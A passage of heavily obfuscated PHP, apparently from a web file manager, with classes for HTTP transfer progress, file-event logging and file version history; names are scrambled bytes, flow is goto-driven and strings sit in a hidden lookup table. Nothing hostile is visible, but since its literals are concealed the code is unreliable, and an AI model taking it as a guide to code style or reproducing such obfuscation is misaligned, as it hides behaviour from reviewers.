function curlProgressEnd($EÎÃ†™‘ë”) { goto DèëÙÁ¿ ‡; DÚÒ‹¯¿: $this->update(); goto b®¯ØÆò¾¤; cÈ˜™ãø§ó: $Dç•ÎŞôâ = $d¯Š“ø¤à†[$f‚¦É”í[1552]]; if ($Dç•ÎŞôâ == -1) { $Dç•ÎŞôâ = $d¯Š“ø¤à†[$f‚¦É”í[1553]]; } if ($Eå­ŒÁ½»[$f‚¦É”í[1536]] == $f‚¦É”í[113] && $Dç•ÎŞôâ) { $Eå­ŒÁ½»[$f‚¦É”í[1537]] += $Dç•ÎŞôâ; } goto DÚÒ‹¯¿; DèëÙÁ¿ ‡: $f‚¦É”í =& $_SERVER[¢Í]; $Eå­ŒÁ½» =& $this->task; $d¯Š“ø¤à† = curl_getinfo($EÎÃ†™‘ë”); goto cÈ˜™ãø§ó; b®¯ØÆò¾¤: } } class TaskHttp extends Task { protected function startAfter() { $E‚‹‹ë¿¨ó =& $_SERVER[¢Í]; $e¾ÓŞøË” =& $this->task; $e¾ÓŞøË”[$E‚‹‹ë¿¨ó[1554]] = 1; Hook::bind($E‚‹‹ë¿¨ó[1526], array($this, $E‚‹‹ë¿¨ó[1555])); Hook::bind($E‚‹‹ë¿¨ó[1528], array($this, $E‚‹‹ë¿¨ó[1556])); Hook::bind($E‚‹‹ë¿¨ó[1530], array($this, $E‚‹‹ë¿¨ó[1557])); } protected function endAfter() { $dóôœà×¤™ =& $_SERVER[¢Í]; Hook::unbind($dóôœà×¤™[1526], array($this, $dóôœà×¤™[1555])); Hook::unbind($dóôœà×¤™[1528], array($this, $dóôœà×¤™[1556])); Hook::unbind($dóôœà×¤™[1530], array($this, $dóôœà×¤™[1557])); } public function progressStart($bÊƒÍÙº¼­) { $cÒßÖŠÒ” =& $_SERVER[¢Í]; $f¯°ÖùŞ¯Ü = curl_getinfo($bÊƒÍÙº¼­); self::log($cÒßÖŠÒ”[1558] . $f¯°ÖùŞ¯Ü[$cÒßÖŠÒ”[310]]); self::valueSet($this->task[$cÒßÖŠÒ”[392]], $this->task); } public function progressEnd($C“øˆ¡ÄØ) { $C¤øßÀøøŸ =& $_SERVER[¢Í]; self::log($C¤øßÀøøŸ[1559] . $this->task[$C¤øßÀøøŸ[392]]); $this->end(); } public function progress($eÄ†ÛÉÙù—, $e¶‚¢éã™Ô, $fÙŞë£¶Şˆ, $bˆÑò–œö‰, $D’¢¥®™¿ö) { $C«ÄÔÇ“‰İ =& $_SERVER[¢Í]; $fíß‘‡ƒ’ñ =& $this->task; if ($D’¢¥®™¿ö > 0) { $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]] = $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]] == 0 ? $bˆÑò–œö‰ : $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]]; $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[1003]] = $D’¢¥®™¿ö; } else { if ($fÙŞë£¶Şˆ > 0) { $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]] = $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]] == 0 ? $e¶‚¢éã™Ô : $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[989]]; $fíß‘‡ƒ’ñ[$C«ÄÔÇ“‰İ[1003]] = $fÙŞë£¶Şˆ; } } $this->update(); self::log("\x70\x72\157\147\162\145\x73\163\110\x74\164\160\x3a\144\x6f\x77\x6e\72{$fÙŞë£¶Şˆ}\x2f{$e¶‚¢éã™Ô}\73\x20\165\x70\154\x6f\141\144\x3a{$D’¢¥®™¿ö}\57{$bˆÑò–œö‰}\73"); } } goto B³É²èå‘”; D£¥œ–¦ÛÕ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\x63\145\137\145\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\x69\x6d\145", "\164\151\x6d\x65", "\151\156\163\145\x72\x74", "\x66\x75\156\143\x74\151\157\156"), array("\144\145\163\143", '', "\151\156\x73\145\162\x74\54\165\x70\x64\x61\x74\x65\54\x73\145\x6c\145\143\x74", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($bà‹šôö¢è, $b¦…¥Œ¸, $E½œÑİŠ¹§ = '') { goto dˆšÇÎ‡†; Bİ–ï“÷ª: $a†Ø¯øéÈÀ = array($EùÁÏ£¯›­[408] => $bà‹šôö¢è, $EùÁÏ£¯›­[1857] => $CÈ÷ÙšÖÅ×[$EùÁÏ£¯›­[487]], $EùÁÏ£¯›­[1858] => $CÈ÷ÙšÖÅ×[$EùÁÏ£¯›­[28]], $EùÁÏ£¯›­[492] => $CÈ÷ÙšÖÅ×[$EùÁÏ£¯›­[492]], $EùÁÏ£¯›­[1481] => USER_ID, $EùÁÏ£¯›­[413] => $b¦…¥Œ¸, $EùÁÏ£¯›­[1483] => $E½œÑİŠ¹§); $this->addSystemLog($b¦…¥Œ¸, $a†Ø¯øéÈÀ); return $this->add($a†Ø¯øéÈÀ); goto DâÊä™ÁÛ®; dˆšÇÎ‡†: $EùÁÏ£¯›­ =& $_SERVER[¢Í]; if (!$this->eventSave) { return; } $CÈ÷ÙšÖÅ× = Model($EùÁÏ£¯›­[1169])->sourceInfo($bà‹šôö¢è); goto d˜“õÓ‰ÒË; d˜“õÓ‰ÒË: if (!$CÈ÷ÙšÖÅ×) { return !1; } if ($this->isCacheEvent($CÈ÷ÙšÖÅ×, $b¦…¥Œ¸)) { return; } if ($E½œÑİŠ¹§ && is_string($E½œÑİŠ¹§)) { $E½œÑİŠ¹§ = array($EùÁÏ£¯›­[1682] => $E½œÑİŠ¹§); } goto Bİ–ï“÷ª; DâÊä™ÁÛ®: } private function addSystemLog($AêÅ„Ûì£Ï, $b®õÖ®«ø) { $d®¿²ò˜„¬ =& $_SERVER[¢Í]; if ($AêÅ„Ûì£Ï == $d®¿²ò˜„¬[1859]) { $AêÅ„Ûì£Ï = $b®õÖ®«ø[$d®¿²ò˜„¬[430]][$d®¿²ò˜„¬[1860]]; } else { if (in_array($AêÅ„Ûì£Ï, array($d®¿²ò˜„¬[1625], $d®¿²ò˜„¬[1861]))) { $AêÅ„Ûì£Ï = $b®õÖ®«ø[$d®¿²ò˜„¬[430]][$d®¿²ò˜„¬[706]]; } } $eæ¡à¼ÁÌ© = array_merge($b®õÖ®«ø, array($d®¿²ò˜„¬[1862] => $b®õÖ®«ø[$d®¿²ò˜„¬[394]], $d®¿²ò˜„¬[1863] => $b®õÖ®«ø[$d®¿²ò˜„¬[1863]])); Model($d®¿²ò˜„¬[1588])->addLog($d®¿²ò˜„¬[1864] . $AêÅ„Ûì£Ï, $eæ¡à¼ÁÌ©); } private function isCacheEvent($c„ÇÇ°”Éâ, $aŸŠÄ÷ã¬Œ) { if ($c„ÇÇ°”Éâ[$_SERVER[¢Í][396]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($DÆÈêôÈöÏ, $AóøÀìÂ±) { $e÷—õ»´îÕ =& $_SERVER[¢Í]; $Fªêª´é•® = Model($e÷—õ»´îÕ[1169])->sourceInfo($DÆÈêôÈöÏ); $FÔÁ¡ÏåÏ¿ = array($e÷—õ»´îÕ[1860] => $AóøÀìÂ±, $e÷—õ»´îÕ[28] => $Fªêª´é•®[$e÷—õ»´îÕ[28]]); return $this->addEvent($DÆÈêôÈöÏ, $e÷—õ»´îÕ[1859], $FÔÁ¡ÏåÏ¿); } public function eventFileEdit($eÏ…¿…è‘¨) { $eÛ¢Ùå®ÍÕ =& $_SERVER[¢Í]; $FùŠŒ£÷¶Î = array($eÛ¢Ùå®ÍÕ[1865] => $_SERVER[$eÛ¢Ùå®ÍÕ[1866]], $eÛ¢Ùå®ÍÕ[1867] => strtolower(ACTION)); return $this->addEvent($eÏ…¿…è‘¨, $eÛ¢Ùå®ÍÕ[1615], $FùŠŒ£÷¶Î); } public function eventRecycle($D¸ãÇùĞ², $CÕÖ˜ÎÒ) { return $this->addEvent($D¸ãÇùĞ², $_SERVER[¢Í][1861], $CÕÖ˜ÎÒ); } public function eventRemove($a…£áŸ»˜) { $BÖ‘ó¶‚‹ª =& $_SERVER[¢Í]; $B²íãŒ¦ä† = Model($BÖ‘ó¶‚‹ª[1169])->sourceInfo($a…£áŸ»˜); $DîÜØª•àñ = $B²íãŒ¦ä†[$BÖ‘ó¶‚‹ª[28]]; return $this->addEvent($B²íãŒ¦ä†[$BÖ‘ó¶‚‹ª[487]], $BÖ‘ó¶‚‹ª[1614], $DîÜØª•àñ); } public function eventShare($a©»ôŒ´²Ò, $eÉÉãë×„) { return $this->addEvent($a©»ôŒ´²Ò, $_SERVER[¢Í][1625], $eÉÉãë×„); } public function eventMove($fë“ì¹Ø‹…, $D„£ïëŒØ, $b´«µÒŸœÆ) { goto c‡ØŠÓå; d£•™Ï÷Ô¥: $f‘ìªë…Ùè = $dóÉšÉÅÙ¦->sourceInfo($D„£ïëŒØ); $C®×”†ùÙ± = $dóÉšÉÅÙ¦->sourceInfo($b´«µÒŸœÆ); $A÷½ˆŠŒ©„ = array($eğÈñÆÏÙˆ[1022] => $D„£ïëŒØ, $eğÈñÆÏÙˆ[1868] => $f‘ìªë…Ùè[$eğÈñÆÏÙˆ[28]], $eğÈñÆÏÙˆ[1849] => $f‘ìªë…Ùè[$eğÈñÆÏÙˆ[492]], $eğÈñÆÏÙˆ[1023] => $b´«µÒŸœÆ, $eğÈñÆÏÙˆ[1869] => $C®×”†ùÙ±[$eğÈñÆÏÙˆ[28]], $eğÈñÆÏÙˆ[1870] => $C®×”†ùÙ±[$eğÈñÆÏÙˆ[492]]); goto aÈ—‰ÏÔéô; c‡ØŠÓå: $eğÈñÆÏÙˆ =& $_SERVER[¢Í]; $dóÉšÉÅÙ¦ = Model($eğÈñÆÏÙˆ[1169]); $F¹­áà–¸ï = $dóÉšÉÅÙ¦->sourceInfo($fë“ì¹Ø‹…); goto d£•™Ï÷Ô¥; D„ôœé™Ù‘: $this->addEvent($D„£ïëŒØ, $eğÈñÆÏÙˆ[1871], $A÷½ˆŠŒ©„); goto Fé‹çÖ¦; aÈ—‰ÏÔéô: $this->addEvent($fë“ì¹Ø‹…, $eğÈñÆÏÙˆ[518], $A÷½ˆŠŒ©„); $F¹­áà–¸ï = $dóÉšÉÅÙ¦->sourceInfo($fë“ì¹Ø‹…); $A÷½ˆŠŒ©„ = array($eğÈñÆÏÙˆ[394] => $F¹­áà–¸ï[$eğÈñÆÏÙˆ[394]], $eğÈñÆÏÙˆ[28] => $F¹­áà–¸ï[$eğÈñÆÏÙˆ[28]]); goto D„ôœé™Ù‘; Fé‹çÖ¦: } public function eventCopy($Aò³™Ù¤’º) { $this->eventCreate($Aò³™Ù¤’º, $_SERVER[¢Í][516]); } public function eventRename($DÌ˜¡„£â, $DÌ´±¤¼ö®, $aôÉ´Ş¼Ç—) { $E‚áÓ¸ˆ¡ =& $_SERVER[¢Í]; $aˆªËë¥Øö = array($E‚áÓ¸ˆ¡[1022] => $DÌ´±¤¼ö®, $E‚áÓ¸ˆ¡[1023] => $aôÉ´Ş¼Ç—); return $this->addEvent($DÌ˜¡„£â, $E‚áÓ¸ˆ¡[1182], $aˆªËë¥Øö); } public function eventAddComment($dˆ·î„»‚‹, $A˜¤¦©) { return $this->addEvent($dˆ·î„»‚‹, $_SERVER[¢Í][1872], $A˜¤¦©); } public function eventAddDesc($E¥õíŒÅ±¬, $b©ê›Ì¨ªÏ) { return $this->addEvent($E¥õíŒÅ±¬, $_SERVER[¢Í][1873], $b©ê›Ì¨ªÏ); } public function listBySource($dË±ƒùÛŸù) { goto AäºøÎĞêƒ; A‘ĞĞóÒñé: if ($dÃºÅïÚÅ†[$eóˆœìÍ†[395]] == $eóˆœìÍ†[93]) { $cº÷ÖÆöœ = Model($eóˆœìÍ†[1169])->listSearchChildren($dË±ƒùÛŸù, 20000); $cº÷ÖÆöœ[] = $dË±ƒùÛŸù . $eóˆœìÍ†[377]; $C·øÚ°ù©Æ = array($eóˆœìÍ†[394] => array($eóˆœìÍ†[7], $cº÷ÖÆöœ)); } $Eì›Ö‹´ = $this->where($C·øÚ°ù©Æ)->order($eóˆœìÍ†[1874])->selectPage(); if ($Eì›Ö‹´[$eóˆœìÍ†[367]][$eóˆœìÍ†[368]] == 0) { $Eì›Ö‹´[$eóˆœìÍ†[367]][$eóˆœìÍ†[368]] = 1; $Eì›Ö‹´[$eóˆœìÍ†[370]] = array(array($eóˆœìÍ†[408] => $dË±ƒùÛŸù, $eóˆœìÍ†[1857] => $dÃºÅïÚÅ†[$eóˆœìÍ†[487]], $eóˆœìÍ†[1481] => $dÃºÅïÚÅ†[$eóˆœìÍ†[403]], $eóˆœìÍ†[413] => $eóˆœìÍ†[1875], $eóˆœìÍ†[414] => $dÃºÅïÚÅ†[$eóˆœìÍ†[200]], $eóˆœìÍ†[1483] => $eóˆœìÍ†[33])); } goto CÄ”ñ±¹éÁ; CÄ”ñ±¹éÁ: return $this->eventListParse($Eì›Ö‹´, $dË±ƒùÛŸù); goto C§Ş½¿ˆ; AäºøÎĞêƒ: $eóˆœìÍ† =& $_SERVER[¢Í]; $dÃºÅïÚÅ† = Model($eóˆœìÍ†[1169])->sourceInfo($dË±ƒùÛŸù); $C·øÚ°ù©Æ = array($eóˆœìÍ†[408] => $dË±ƒùÛŸù); goto A‘ĞĞóÒñé; C§Ş½¿ˆ: } private function eventListParse($c„ù›¯·´ä, $b§”’õ‚¨) { goto CÄ¹ø¹‡Â˜; C¯–åÓ“óê: $c„ù›¯·´ä[$F„Êˆ†àö[370]] = $aèğ®œ÷¶; return $c„ù›¯·´ä; goto DçŞœ„ïåä; Eºº“Ğ²ìç: $d‘‰«”ˆÍ = Model($F„Êˆ†àö[765])->sourceListInfo($fóĞ‚½ˆ°°, !0); foreach ($aèğ®œ÷¶ as &$dÚ×ã‘ÕŒ) { if ($dÚ×ã‘ÕŒ[$F„Êˆ†àö[29]] == $F„Êˆ†àö[518] && isset($dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[1022]])) { $dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[1022]] = $d‘‰«”ˆÍ[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[1022]]]; $dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[1023]] = $d‘‰«”ˆÍ[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[1023]]]; } if ($dÚ×ã‘ÕŒ[$F„Êˆ†àö[29]] == $F„Êˆ†àö[1871] && isset($dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[394]])) { $dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[394]] = $d‘‰«”ˆÍ[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]][$F„Êˆ†àö[394]]]; } $dÚ×ã‘ÕŒ[$F„Êˆ†àö[416]] = $d‘‰«”ˆÍ[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[394]]]; $dÚ×ã‘ÕŒ[$F„Êˆ†àö[1876]] = $d‘‰«”ˆÍ[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[1863]]]; if ($dÚ×ã‘ÕŒ[$F„Êˆ†àö[29]] == $F„Êˆ†àö[1614]) { $dÚ×ã‘ÕŒ[$F„Êˆ†àö[1876]] = $dÚ×ã‘ÕŒ[$F„Êˆ†àö[416]]; $dÚ×ã‘ÕŒ[$F„Êˆ†àö[1863]] = $dÚ×ã‘ÕŒ[$F„Êˆ†àö[1876]][$F„Êˆ†àö[394]]; $dÚ×ã‘ÕŒ[$F„Êˆ†àö[416]] = !1; $dÚ×ã‘ÕŒ[$F„Êˆ†àö[394]] = $F„Êˆ†àö[33]; } $dÚ×ã‘ÕŒ[$F„Êˆ†àö[1806]] = $DƒÊ¸¸ºÂ³[$dÚ×ã‘ÕŒ[$F„Êˆ†àö[1489]]]; } unset($dÚ×ã‘ÕŒ); goto C¯–åÓ“óê; Eãîñ‡÷±ø: $fóĞ‚½ˆ°° = array_unique($fóĞ‚½ˆ°°); $c«ß²œ¨ãƒ = array_unique(array_to_keyvalue($aèğ®œ÷¶, $F„Êˆ†àö[33], $F„Êˆ†àö[1489])); $DƒÊ¸¸ºÂ³ = Model($F„Êˆ†àö[503])->userListInfo($c«ß²œ¨ãƒ); goto Eºº“Ğ²ìç; CÄ¹ø¹‡Â˜: $F„Êˆ†àö =& $_SERVER[¢Í]; $aèğ®œ÷¶ = $c„ù›¯·´ä[$F„Êˆ†àö[370]]; $fóĞ‚½ˆ°° = array_to_keyvalue($aèğ®œ÷¶, $F„Êˆ†àö[33], $F„Êˆ†àö[394]); goto Aºà¸ˆŸ; Aºà¸ˆŸ: $fÂ²ÙÒÕ‚‰ = array_to_keyvalue($aèğ®œ÷¶, $F„Êˆ†àö[33], $F„Êˆ†àö[1863]); foreach ($aèğ®œ÷¶ as $dÚ×ã‘ÕŒ) { $F¸ËÇ‚Ê‡Š = $dÚ×ã‘ÕŒ[$F„Êˆ†àö[430]]; if ($dÚ×ã‘ÕŒ[$F„Êˆ†àö[29]] == $F„Êˆ†àö[518] && isset($F¸ËÇ‚Ê‡Š[$F„Êˆ†àö[1022]])) { $fóĞ‚½ˆ°°[] = $F¸ËÇ‚Ê‡Š[$F„Êˆ†àö[1022]] . $F„Êˆ†àö[33]; $fóĞ‚½ˆ°°[] = $F¸ËÇ‚Ê‡Š[$F„Êˆ†àö[1023]] . $F„Êˆ†àö[33]; } if ($dÚ×ã‘ÕŒ[$F„Êˆ†àö[29]] == $F„Êˆ†àö[1871] && isset($F¸ËÇ‚Ê‡Š[$F„Êˆ†àö[394]])) { $fóĞ‚½ˆ°°[] = $F¸ËÇ‚Ê‡Š[$F„Êˆ†àö[394]] . $F„Êˆ†àö[33]; } } $fóĞ‚½ˆ°° = array_merge($fóĞ‚½ˆ°°, $fÂ²ÙÒÕ‚‰, array($b§”’õ‚¨ . $F„Êˆ†àö[33])); goto Eãîñ‡÷±ø; DçŞœ„ïåä: } public function removeBySource($f¦‹ô’´ÜÌ) { $Eğ«í¥ø«ô = array($_SERVER[¢Í][408] => $f¦‹ô’´ÜÌ); $this->where($Eğ«í¥ø«ô)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\145\137\150\151\x73\164\x6f\x72\171"; public function historyCount($e¾ÑÅ¹«Ï) { goto aÒÅÅêÅ¸; B¾“‡ã‡‹å: return array_to_keyvalue($a‡Ö‡ÂÙÛµ, $d¼Ú’¥º±†[394], $d¼Ú’¥º±†[1681]); goto bé™½èö´„; C´é‘ĞÛ³ƒ: $fÌ¢ÈóŠğ = $d¼Ú’¥º±†[1877]; $AùŠòáËßì = array($d¼Ú’¥º±†[394] => array($d¼Ú’¥º±†[7], $e¾ÑÅ¹«Ï)); $a‡Ö‡ÂÙÛµ = $this->field($fÌ¢ÈóŠğ)->where($AùŠòáËßì)->group($d¼Ú’¥º±†[394])->select(); goto B¾“‡ã‡‹å; aÒÅÅêÅ¸: $d¼Ú’¥º±† =& $_SERVER[¢Í]; if (!$e¾ÑÅ¹«Ï) { return array(); } if (is_string($e¾ÑÅ¹«Ï) || is_int($e¾ÑÅ¹«Ï)) { $e¾ÑÅ¹«Ï = array($e¾ÑÅ¹«Ï); } goto C´é‘ĞÛ³ƒ; bé™½èö´„: } public function addHistory($cÊÃîĞÇ, $Bâ¨øÈÛ¶î = '') { $C¯í„ë‘¹» =& $_SERVER[¢Í]; $E²é™ÑÜï¸ = array($C¯í„ë‘¹»[408] => $cÊÃîĞÇ[$C¯í„ë‘¹»[394]], $C¯í„ë‘¹»[1481] => isset($cÊÃîĞÇ[$C¯í„ë‘¹»[404]]) ? $cÊÃîĞÇ[$C¯í„ë‘¹»[404]] : $cÊÃîĞÇ[$C¯í„ë‘¹»[403]], $C¯í„ë‘¹»[445] => $cÊÃîĞÇ[$C¯í„ë‘¹»[444]], $C¯í„ë‘¹»[546] => $cÊÃîĞÇ[$C¯í„ë‘¹»[87]], $C¯í„ë‘¹»[1878] => $Bâ¨øÈÛ¶î); $DÕ×‚ØÓ‹Ó = $GLOBALS[$C¯í„ë‘¹»[6]][$C¯í„ë‘¹»[94]][$C¯í„ë‘¹»[1070]]; if ($DÕ×‚ØÓ‹Ó > 1) { $this->historyAutoClear($E²é™ÑÜï¸[$C¯í„ë‘¹»[394]]); $this->add($E²é™ÑÜï¸); } Hook::trigger($C¯í„ë‘¹»[1879], $E²é™ÑÜï¸); Model($C¯í„ë‘¹»[1880])->eventFileEdit($cÊÃîĞÇ[$C¯í„ë‘¹»[394]]); } private function historyAutoClear($e¬Òˆ£™à) { goto f‘µÆ²ÈÈ¬; eœ¬êÌó”Ï: $Dİ§ö¶Ô™ = $B…›ÊÎÜ¦Ø == $FòÅÁœÃ [1092] ? 5 : $FË…¬¿¤Ó«; if ($FË…¬¿¤Ó« <= 1) { $Dİ§ö¶Ô™ = 1; } if ($Dİ§ö¶Ô™ >= 500) { return; } goto e—¥ƒ˜•ç; e—¥ƒ˜•ç: $BÀÛÙ¯ì¸ = array($FòÅÁœÃ [408] => $e¬Òˆ£™à); $cÍø¾‡‡¶¼ = $this->field($FòÅÁœÃ [1881])->where($BÀÛÙ¯ì¸)->order($FòÅÁœÃ [1874])->select(); if (!$cÍø¾‡‡¶¼ || $Dİ§ö¶Ô™ >= count($cÍø¾‡‡¶¼)) { return; } goto F’¡²Úøëï; b½¤˜¤‹„ê: $this->where($BÀÛÙ¯ì¸)->delete(); Model($FòÅÁœÃ [447])->remove($cùÏŒñ»¬¤); goto DÁßÜ‰˜¹‹; Eöé–Æøù…: $cùÏŒñ»¬¤ = array_slice($cùÏŒñ»¬¤, $Dİ§ö¶Ô™); if (!$d¼êš¿äº½ || !$cùÏŒñ»¬¤) { return; } $BÀÛÙ¯ì¸ = array($FòÅÁœÃ [410] => array($FòÅÁœÃ [7], $d¼êš¿äº½)); goto b½¤˜¤‹„ê; f‘µÆ²ÈÈ¬: $FòÅÁœÃ  =& $_SERVER[¢Í]; $B…›ÊÎÜ¦Ø = Model($FòÅÁœÃ [1090])->get($FòÅÁœÃ [1091]); $FË…¬¿¤Ó« = $GLOBALS[$FòÅÁœÃ [6]][$FòÅÁœÃ [94]][$FòÅÁœÃ [1070]]; goto eœ¬êÌó”Ï; F’¡²Úøëï: $d¼êš¿äº½ = array_to_keyvalue($cÍø¾‡‡¶¼, $FòÅÁœÃ [33], $FòÅÁœÃ [392]); $d¼êš¿äº½ = array_slice($d¼êš¿äº½, $Dİ§ö¶Ô™); $cùÏŒñ»¬¤ = array_to_keyvalue($cÍø¾‡‡¶¼, $FòÅÁœÃ [33], $FòÅÁœÃ [444]); goto Eöé–Æøù…; DÁßÜ‰˜¹‹: } public function listData($A§éÁ×§Æé) { goto CÎØÒÎî¢¯; CÜˆ‹òåÏ“: $dÔá†ï¦¨¬ = 3; if ($F“ßóÒÍÙ == $CÒ´ºŒ¢šå[1092]) { $dòë—³òè[$CÒ´ºŒ¢šå[370]] = array_slice($dòë—³òè[$CÒ´ºŒ¢šå[370]], 0, $dÔá†ï¦¨¬); $dòë—³òè[$CÒ´ºŒ¢šå[367]] = array($CÒ´ºŒ¢šå[1883] => 1, $CÒ´ºŒ¢šå[1884] => 20, $CÒ´ºŒ¢šå[1885] => 1, $CÒ´ºŒ¢šå[1886] => count($dòë—³òè[$CÒ´ºŒ¢šå[370]])); } return $dòë—³òè; goto Bù¥È†Û×; bŞ¡‡ÒŞ›†: $dòë—³òè = $this->field($FÑÖâ˜ø)->where($B×£â¹Şò¤)->order($CÒ´ºŒ¢šå[1874])->selectPage(); $this->_listAppendUser($dòë—³òè[$CÒ´ºŒ¢šå[370]]); $F“ßóÒÍÙ = Model($CÒ´ºŒ¢šå[1090])->get($CÒ´ºŒ¢šå[1091]); goto CÜˆ‹òåÏ“; CÎØÒÎî¢¯: $CÒ´ºŒ¢šå =& $_SERVER[¢Í]; $B×£â¹Şò¤ = array($CÒ´ºŒ¢šå[408] => $A§éÁ×§Æé); $FÑÖâ˜ø = $CÒ´ºŒ¢šå[1882]; goto bŞ¡‡ÒŞ›†; Bù¥È†Û×: } protected function _listAppendUser(&$cÔ–ôš¼êÑ) { $eì’½ÂŞ•è =& $_SERVER[¢Í]; $F‹»®­×§‡ = array_to_keyvalue($cÔ–ôš¼êÑ, $eì’½ÂŞ•è[33], $eì’½ÂŞ•è[1489]); $e‘öœ¾æ®­ = Model($eì’½ÂŞ•è[503])->userListInfo($F‹»®­×§‡); foreach ($cÔ–ôš¼êÑ as &$b‘Ùò³Š) { $f¯ÒøÛ›«± = $b‘Ùò³Š[$eì’½ÂŞ•è[1489]]; $b‘Ùò³Š[$eì’½ÂŞ•è[403]] = $e‘öœ¾æ®­[$f¯ÒøÛ›«±] ? $e‘öœ¾æ®­[$f¯ÒøÛ›«±] : !1; } unset($b‘Ùò³Š); } public function fileInfo($BÍ·³ğñŒ›) { $a¿öˆ°ŠÉ =& $_SERVER[¢Í]; $b¤©Ü±‚Á¹ = $this->tablePrefix; $E«¨ˆÖÑ©â = "{$b¤©Ü±‚Á¹}\151\157\x5f\146\x69\154\145\40\x66\x69\154\145\x73\x20\157\156\40\146\x69\x6c\145\x73\x2e\x66\151\154\x65\x49\x44\x20\75\40\150\151\x73\x74\x6f\x72\x79\56\x66\151\x6c\145\111\x44"; return $this->alias($a¿öˆ°ŠÉ[1887])->where(array($a¿öˆ°ŠÉ[410] => $BÍ·³ğñŒ›))->join($E«¨ˆÖÑ©â, $a¿öˆ°ŠÉ[1888])->find(); } public function removeItem($aŒŒ–ÉÙá†) { $FµÓ©¬Ëï† =& $_SERVER[¢Í]; $bìÈÆ­¹ˆŞ = array($FµÓ©¬Ëï†[410] => $aŒŒ–ÉÙá†); $CÉ²çˆ¤³Ó = $this->where($bìÈÆ­¹ˆŞ)->find(); if ($CÉ²çˆ¤³Ó) { $cÈ…ë ¾Ñò = $this->where($bìÈÆ­¹ˆŞ)->delete(); Model($FµÓ©¬Ëï†[447])->remove($CÉ²çˆ¤³Ó[$FµÓ©¬Ëï†[444]]); return $cÈ…ë ¾Ñò; } return !1; } public function removeBySource($F‡­°íƒª¸) { goto FöÖäœ˜‚¢; aŒËŸ§‘¶„: $d¼Ÿ­×ğ¦ = array($b‹‡´ôÕ¯[408] => array($b‹‡´ôÕ¯[7], $F‡­°íƒª¸)); $D¨ÃÒÉ’£¬ = $this->field($b‹‡´ôÕ¯[445])->where($d¼Ÿ­×ğ¦)->select(); if ($D¨ÃÒÉ’£¬) { $this->where($d¼Ÿ­×ğ¦)->delete(); $Cõ«‹Ö¶—á = array_to_keyvalue($D¨ÃÒÉ’£¬, $b‹‡´ôÕ¯[33], $b‹‡´ôÕ¯[444]); Model($b‹‡´ôÕ¯[447])->remove($Cõ«‹Ö¶—á); } goto aŒ„ğ–¦Ğ; FöÖäœ˜‚¢: $b‹‡´ôÕ¯ =& $_SERVER[¢Í]; if (!$F‡­°íƒª¸) { return !1; } if (!is_array($F‡­°íƒª¸)) { $F‡­°íƒª¸ = array($F‡­°íƒª¸); } goto aŒËŸ§‘¶„; aŒ„ğ–¦Ğ: return !0; goto d¹Š‘Æ…–; d¹Š‘Æ…–: } public function setDetail($dƒ¯ºÙ‘, $Eé­ï¾ëòÉ) { $eôª„¶ïµÕ =& $_SERVER[¢Í]; return $this->where(array($eôª„¶ïµÕ[410] => $dƒ¯ºÙ‘))->save(array($eôª„¶ïµÕ[1878] => $Eé­ï¾ëòÉ)); } public function rollbackToItem($dâ•®Šó“, $c©İÃ¨ìÁë) { goto B¼µõÉÖ¡«; a¶•¼Ùçç¼: return $this->where(array($B’¶Êç“™Œ[410] => $c©İÃ¨ìÁë))->delete(); goto cÛÜÁ†‰ÕÅ; EĞØ”ÄÆ˜Ì: $Fºåµ•íİã = $this->find($c©İÃ¨ìÁë); $EÔè¡·§¶ = array($B’¶Êç“™Œ[444] => $Fºåµ•íİã[$B’¶Êç“™Œ[444]], $B’¶Êç“™Œ[87] => $Fºåµ•íİã[$B’¶Êç“™Œ[87]], $B’¶Êç“™Œ[117] => time(), $B’¶Êç“™Œ[404] => USER_ID); Model($B’¶Êç“™Œ[765])->where(array($B’¶Êç“™Œ[394] => $dâ•®Šó“))->save($EÔè¡·§¶); goto a¶•¼Ùçç¼; B¼µõÉÖ¡«: $B’¶Êç“™Œ =& $_SERVER[¢Í]; $Bæ¬÷×ˆ•“ = Model($B’¶Êç“™Œ[765])->sourceInfo($dâ•®Šó“); $this->addHistory($Bæ¬÷×ˆ•“, LNG($B’¶Êç“™Œ[1889])); goto EĞØ”ÄÆ˜Ì; cÛÜÁ†‰ÕÅ: } public function clearSame($fÂÈ…ñŞ) { goto bƒ—î®öé; eËö‰Œ×ÍÉ: $B¡ÅØîŸ¨ = array(); $BâõĞ‚ñ…í = array(); foreach ($Ağ±áÑ˜â as $Dòï–÷¤Ú°) { if (!$Dòï–÷¤Ú° || count($Dòï–÷¤Ú°) <= 1) { continue; } foreach ($Dòï–÷¤Ú° as $dè‘ĞŞ –õ) { $B¡ÅØîŸ¨[] = $dè‘ĞŞ –õ[$aç¼¨ï«Ÿ[444]]; $BâõĞ‚ñ…í[] = $dè‘ĞŞ –õ[$aç¼¨ï«Ÿ[392]]; } } goto fÖÁ‚“‘´; bƒ—î®öé: $aç¼¨ï«Ÿ =& $_SERVER[¢Í]; $BÖÁƒ“äŒ = 